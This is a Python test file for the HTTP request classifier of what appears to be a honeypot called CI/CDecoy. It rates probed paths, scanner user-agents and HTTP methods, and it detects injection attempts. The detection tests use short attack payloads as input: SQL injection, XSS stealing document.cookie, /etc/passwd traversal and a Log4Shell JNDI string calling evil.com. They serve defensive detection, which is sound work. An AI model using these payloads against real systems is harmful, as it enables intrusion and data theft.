"""
CI/CDecoy -- HTTP Enrichment Classifier Tests

Tests for path classification, user-agent detection, injection detection,
method classification, and the combined classify() method.
"""

from http_enrichment import HttpRequestClassifier

# =========================================================================
#  Path Classification
# =========================================================================


class TestPathClassification:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    # -- critical paths --

    def test_dot_env_is_critical(self):
        result = self.classifier.classify_path("/.env")
        assert result["severity"] == "critical"
        assert result["technique_id"] == "T1190"

    def test_git_config_is_critical(self):
        result = self.classifier.classify_path("/.git/config")
        assert result["severity"] == "critical"
        assert "source-exposure" in result["tags"]

    def test_svn_is_critical(self):
        result = self.classifier.classify_path("/.svn/entries")
        assert result["severity"] == "critical"

    def test_backup_sql_is_critical(self):
        result = self.classifier.classify_path("/backup.sql")
        assert result["severity"] == "critical"
        assert result["technique_id"] == "T1005"

    def test_wp_config_is_critical(self):
        result = self.classifier.classify_path("/wp-config.php")
        assert result["severity"] == "critical"

    def test_config_php_is_critical(self):
        result = self.classifier.classify_path("/config.php")
        assert result["severity"] == "critical"

    # -- high paths --

    def test_wp_login_is_high(self):
        result = self.classifier.classify_path("/wp-login.php")
        assert result["severity"] == "high"
        assert result["technique_id"] == "T1078"

    def test_phpmyadmin_is_high(self):
        result = self.classifier.classify_path("/phpmyadmin/")
        assert result["severity"] == "high"

    def test_admin_panel_is_high(self):
        result = self.classifier.classify_path("/admin/")
        assert result["severity"] == "high"

    def test_actuator_env_is_high(self):
        result = self.classifier.classify_path("/actuator/env")
        assert result["severity"] == "high"
        assert "debug-endpoint" in result["tags"]

    # -- medium paths --

    def test_api_auth_is_medium(self):
        result = self.classifier.classify_path("/api/v1/auth/login")
        assert result["severity"] == "medium"

    def test_api_users_is_medium(self):
        result = self.classifier.classify_path("/api/v1/users")
        assert result["severity"] == "medium"
        assert result["technique_id"] == "T1087"

    def test_server_status_is_medium(self):
        result = self.classifier.classify_path("/server-status")
        assert result["severity"] == "medium"

    # -- low paths --

    def test_robots_is_low(self):
        result = self.classifier.classify_path("/robots.txt")
        assert result["severity"] == "low"
        assert "recon" in result["tags"]

    def test_sitemap_is_low(self):
        result = self.classifier.classify_path("/sitemap.xml")
        assert result["severity"] == "low"

    # -- unmatched path --

    def test_unknown_path_is_info(self):
        result = self.classifier.classify_path("/about")
        assert result["severity"] == "info"
        assert result["technique_id"] is None


# =========================================================================
#  User-Agent Detection
# =========================================================================


class TestUserAgentDetection:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    def test_sqlmap_detected(self):
        result = self.classifier.classify_user_agent("sqlmap/1.7")
        assert result["tool_signature"] == "sqlmap"
        assert "sqli-scanner" in result["tags"]

    def test_nikto_detected(self):
        result = self.classifier.classify_user_agent("Nikto/2.1.6")
        assert result["tool_signature"] == "Nikto"

    def test_nmap_detected(self):
        result = self.classifier.classify_user_agent("Nmap Scripting Engine")
        assert result["tool_signature"] == "Nmap"

    def test_gobuster_detected(self):
        result = self.classifier.classify_user_agent("gobuster/3.6")
        assert result["tool_signature"] == "directory bruter"
        assert "dir-brute" in result["tags"]

    def test_wpscan_detected(self):
        result = self.classifier.classify_user_agent("WPScan v3.8.25")
        assert result["tool_signature"] == "WPScan"

    def test_nuclei_detected(self):
        result = self.classifier.classify_user_agent("Nuclei - Open-source project")
        assert result["tool_signature"] == "Nuclei"

    def test_python_requests_detected(self):
        result = self.classifier.classify_user_agent("python-requests/2.31.0")
        assert result["tool_signature"] == "Python script"
        assert "scripted" in result["tags"]

    def test_curl_detected(self):
        result = self.classifier.classify_user_agent("curl/8.4.0")
        assert result["tool_signature"] == "CLI tool"

    def test_normal_browser_not_flagged(self):
        ua = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )
        result = self.classifier.classify_user_agent(ua)
        assert result["tool_signature"] is None
        assert result["tags"] == []

    def test_empty_user_agent_flagged(self):
        result = self.classifier.classify_user_agent("")
        assert "no-user-agent" in result["tags"]

    def test_dash_user_agent_flagged(self):
        result = self.classifier.classify_user_agent("-")
        assert "no-user-agent" in result["tags"]


# =========================================================================
#  Injection Detection
# =========================================================================


class TestInjectionDetection:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    def test_sqli_or_1_equals_1(self):
        tags = self.classifier.detect_injection("' OR 1=1 --")
        assert "sqli" in tags

    def test_sqli_union_select(self):
        tags = self.classifier.detect_injection("UNION SELECT username, password FROM users")
        assert "sqli" in tags

    def test_sqli_drop_table(self):
        tags = self.classifier.detect_injection("; DROP TABLE users")
        assert "sqli" in tags

    def test_xss_script_tag(self):
        tags = self.classifier.detect_injection("<script>alert(1)</script>")
        assert "xss" in tags

    def test_xss_javascript_uri(self):
        tags = self.classifier.detect_injection("javascript:alert(document.cookie)")
        assert "xss" in tags

    def test_xss_onerror(self):
        tags = self.classifier.detect_injection('<img src=x onerror=alert(1)>')
        assert "xss" in tags

    def test_path_traversal_detected(self):
        tags = self.classifier.detect_injection("../../../etc/passwd")
        assert "path-traversal" in tags

    def test_path_traversal_etc_passwd(self):
        tags = self.classifier.detect_injection("/etc/passwd")
        assert "path-traversal" in tags

    def test_log4shell_detected(self):
        tags = self.classifier.detect_injection("${jndi:ldap://evil.com/x}")
        assert "log4shell" in tags

    def test_template_injection_detected(self):
        tags = self.classifier.detect_injection("{{7*7}}")
        assert "template-injection" in tags

    def test_clean_input_not_flagged(self):
        tags = self.classifier.detect_injection("normal search query")
        assert len(tags) == 0

    def test_empty_input_not_flagged(self):
        tags = self.classifier.detect_injection("")
        assert len(tags) == 0

    def test_none_input_not_flagged(self):
        tags = self.classifier.detect_injection(None)
        assert len(tags) == 0

    def test_multiple_injections_detected(self):
        tags = self.classifier.detect_injection(
            "' OR 1=1 -- <script>alert(1)</script> ../etc/passwd"
        )
        assert "sqli" in tags
        assert "xss" in tags
        assert "path-traversal" in tags


# =========================================================================
#  Method Classification
# =========================================================================


class TestMethodClassification:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    def test_trace_is_medium(self):
        result = self.classifier.classify_method("TRACE", "/")
        assert result["severity"] == "medium"
        assert "unusual-method" in result["tags"]

    def test_options_is_medium(self):
        result = self.classifier.classify_method("OPTIONS", "/")
        assert result["severity"] == "medium"

    def test_put_is_high(self):
        result = self.classifier.classify_method("PUT", "/upload")
        assert result["severity"] == "high"
        assert "dangerous-method" in result["tags"]

    def test_delete_is_high(self):
        result = self.classifier.classify_method("DELETE", "/api/users/1")
        assert result["severity"] == "high"

    def test_propfind_is_medium(self):
        result = self.classifier.classify_method("PROPFIND", "/")
        assert result["severity"] == "medium"
        assert "webdav-probe" in result["tags"]

    def test_get_is_info(self):
        result = self.classifier.classify_method("GET", "/")
        assert result["severity"] == "info"
        assert result["technique_id"] is None


# =========================================================================
#  Combined Classification
# =========================================================================


class TestCombinedClassification:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    def test_classify_critical_path(self):
        result = self.classifier.classify("GET", "/.env", {})
        assert result["severity"] == "critical"
        assert result["technique_id"] == "T1190"

    def test_classify_with_scanner_ua(self):
        result = self.classifier.classify(
            "GET", "/robots.txt",
            {"User-Agent": "sqlmap/1.7"},
        )
        assert result["tool_signature"] == "sqlmap"
        assert "sqli-scanner" in result["tags"]

    def test_classify_with_injection_in_query(self):
        result = self.classifier.classify(
            "GET", "/api/v1/search",
            {},
            query="q=' OR 1=1 --",
        )
        assert result["severity"] == "high"
        assert "sqli" in result["tags"]

    def test_classify_combines_tags(self):
        result = self.classifier.classify(
            "PUT", "/.env",
            {"User-Agent": "curl/8.0"},
        )
        assert "config-exposure" in result["tags"]
        assert "dangerous-method" in result["tags"]
        assert "cli-tool" in result["tags"]

    def test_classify_normal_request_is_info(self):
        result = self.classifier.classify(
            "GET", "/about",
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"},
        )
        assert result["severity"] == "info"
        assert result["tool_signature"] is None


# =========================================================================
#  Edge Cases
# =========================================================================


class TestEnrichmentEdgeCases:
    def setup_method(self):
        self.classifier = HttpRequestClassifier()

    def test_path_traversal_detection(self):
        """Path traversal sequences should be classified appropriately."""
        # detect_injection recognises "../" and /etc/passwd patterns
        tags = self.classifier.detect_injection("/../../../etc/passwd")
        assert "path-traversal" in tags

        # When traversal appears in a query string, classify() surfaces it
        result = self.classifier.classify(
            "GET", "/read",
            {},
            query="file=/../../../etc/passwd",
        )
        assert result["severity"] == "high"
        assert "path-traversal" in result["tags"]

    def test_empty_path(self):
        """Root path should be handled without errors, classified as info."""
        result = self.classifier.classify_path("/")
        assert result["severity"] == "info"
        assert result["technique_id"] is None

    def test_very_long_path(self):
        """A very long path (2000+ chars) should not crash the classifier."""
        long_path = "/" + "a" * 2500
        result = self.classifier.classify_path(long_path)
        assert "severity" in result
        assert result["severity"] == "info"

        # Full classify() pipeline should also survive
        full = self.classifier.classify("GET", long_path, {})
        assert "severity" in full

    def test_null_byte_in_path(self):
        """Null bytes in the path should be handled safely."""
        result = self.classifier.classify_path("/.env\x00.txt")
        # The path starts with /.env which matches the critical rule
        assert result["severity"] == "critical"
        assert result["technique_id"] == "T1190"

        # Full classify() should also handle null bytes without crashing
        full = self.classifier.classify("GET", "/page\x00.html", {})
        assert "severity" in full
